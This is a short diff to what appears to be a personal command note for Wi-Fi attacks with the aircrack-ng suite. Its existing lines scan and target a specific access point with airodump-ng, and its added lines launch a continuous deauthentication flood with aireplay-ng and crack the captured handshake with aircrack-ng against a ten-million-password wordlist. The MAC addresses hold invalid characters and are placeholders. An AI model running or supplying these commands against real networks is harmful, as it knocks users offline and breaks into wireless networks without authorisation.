@@ -1,2 +1,5 @@
 #airodump-ng wlan0mon
 #airodump-ng --bssid 7C:S2:89:MM:8U:9I --channel 2 wlan0mon 
+
+#aireplay-ng -0 0 -a f3:DS:3E:FF:CC:34 wlan0mon
+#aircrack-ng data.cap -w 10-million-password.txt
